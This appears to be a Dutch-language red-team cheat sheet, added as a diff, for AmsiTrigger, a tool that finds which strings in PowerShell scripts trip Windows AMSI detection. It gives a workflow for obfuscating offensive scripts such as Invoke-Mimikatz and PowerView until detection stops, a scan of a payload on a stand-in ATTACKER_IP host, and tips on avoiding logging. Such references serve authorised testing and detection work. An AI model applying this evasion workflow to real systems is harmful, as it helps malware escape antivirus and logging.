@@ -1,0 +1,37 @@
+# AmsiTrigger — Vind AMSI trigger bytes in PowerShell scripts
+# Identificeert exact welke strings/bytes in een script AMSI detectie triggeren
+#
+# === Syntax ===
+# AmsiTrigger_x64.exe -i <inputfile> [-f <format>] [-u <url>]
+#
+# === Belangrijkste opties ===
+# -i FILE    Input bestand (PowerShell script)
+# -f FORMAT  Output formaat: 1=alleen string, 2=alleen bestandsnaam, 3=beide (standaard)
+# -u URL     Scan script vanaf URL in plaats van lokaal bestand
+# -d         Debug modus (toont meer details)
+#
+# === Werking ===
+# Splitst het script in stukken en test elk deel tegen AMSI
+# Toont exact welke regels/strings als malicious worden gemarkeerd
+# Gebruik de output om gericht te obfuscaten
+#
+# === Voorbeelden ===
+# Scan lokaal PowerShell script:
+AmsiTrigger_x64.exe -i Invoke-Mimikatz.ps1 -f 3
+# Scan script vanaf URL:
+AmsiTrigger_x64.exe -u http://ATTACKER_IP/payloads/amsi-shell.ps1 -f 3
+# Alleen trigger strings tonen:
+AmsiTrigger_x64.exe -i PowerView.ps1 -f 1
+# Debug modus voor meer detail:
+AmsiTrigger_x64.exe -i Invoke-Kerberoast.ps1 -f 3 -d
+#
+# === Workflow ===
+# 1. Draai AmsiTrigger op je script
+# 2. Obfuscate alleen de gedetecteerde strings (variabele hernoemen, encoding, etc.)
+# 3. Draai AmsiTrigger opnieuw om te verifiëren
+# 4. Herhaal tot er geen triggers meer zijn
+#
+# Tip: Draai op je AANVALSMACHINE, niet op het doelsysteem
+# Tip: Defender signatures veranderen — test regelmatig opnieuw
+# Tip: Combineer met Invisi-Shell om logging te voorkomen tijdens testen
+# Tip: Zie ook: amsi_bypass_patch, amsi_bypass_reflection
